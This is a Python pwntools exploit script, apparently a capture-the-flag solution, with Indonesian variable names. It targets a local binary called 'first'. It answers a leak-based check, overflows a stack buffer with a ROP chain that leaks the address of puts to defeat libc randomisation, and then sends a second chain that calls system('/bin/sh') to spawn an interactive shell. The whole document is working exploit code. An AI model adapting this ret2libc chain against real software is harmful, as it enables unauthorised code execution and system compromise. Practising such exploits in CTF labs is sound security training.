from pwn import *

p = process('./first', env={'LD_PRELOAD':'./libc.so.6'})
peilot = 'AAAAAAAAAAAAAAAAAAAAAAAAAAAA'

p.sendline(peilot)
p.recvuntil('datang ')
response = p.recvuntil('\n')
# print response
mampus = response[-3:-1]
# print mampus
mampus = u16(mampus)
# print mampus
p.sendline(str(mampus))

pop_rdi = p64(0x0000000000400a73)
puts_got = p64(0x601018)  # isinya got itu alamat puts
puts_offset = 0x000000000006f690
puts_call = p64(0x00000000004006C0)
binsh_offset = 0x18cd57
system_offset = 0x0000000000045390
main_address = p64(0x00000000004008A4)

peilot2 = 'A'*120+pop_rdi+puts_got+puts_call+main_address
p.sendline(peilot2)
p.recvuntil('inginkan: ')
#print len(p.recvline())
puts_address = u64(p.recvline()[:-1] + "\x00\x00")
libc_base = puts_address - puts_offset
system_address = p64(libc_base + system_offset)
binsh_address = p64(libc_base + binsh_offset)
print hex(puts_address)

p.sendline(peilot)
p.recvuntil('datang ')
response = p.recvuntil('\n')
# print response
mampus = response[-3:-1]
# print mampus
mampus = u16(mampus)
# print mampus
p.sendline(str(mampus))

peilot2 = 'A'*120 + pop_rdi + binsh_address + system_address
p.sendline(peilot2)

p.interactive()

